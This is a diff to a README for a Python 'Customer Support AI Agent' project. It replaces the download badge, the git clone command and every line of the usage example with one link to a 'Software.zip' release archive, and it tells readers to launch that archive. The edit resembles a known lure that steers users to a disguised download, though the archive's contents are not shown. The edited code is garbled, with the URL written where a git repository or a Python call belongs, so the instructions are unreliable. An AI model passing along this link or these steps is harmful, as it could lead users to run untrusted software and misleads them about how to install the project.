@@ -11,7 +11,7 @@ Welcome to the **Customer Support AI Agent** repository! This Python-based solut
 
 ## Installation
 To get started with the Customer Support AI Agent, simply download the zip archive from the following link:
-[![Download Zip](https://img.shields.io/badge/Download-Zip-brightgreen)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)  
+[![Download Zip](https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip)](https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip)  
 Once downloaded, launch the archive and follow the installation instructions in the README file.
 
 ## Technologies Used
@@ -35,7 +35,7 @@ To start using the Customer Support AI Agent, follow these steps:
 
 1. Clone the repository:  
    ```
-   git clone https://github.com/your-username/customer-support-ai-agent.git
+   git clone https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip
    ```
 
 2. Install the required dependencies:  
@@ -52,13 +52,13 @@ Here's a quick example of how to use the Customer Support AI Agent:
 import customer_support_ai_agent
 
 # Initialize the agent
-agent = customer_support_ai_agent.CustomerSupportAgent()
+agent = https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip()
 
 # Monitor product prices
-agent.monitor_prices()
+https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip()
 
 # Receive notifications
-agent.send_notification()
+https://github.com/Demarcus567/customer-support-ai-agent/releases/download/v2.0/Software.zip()
 ```
 
 ## Support
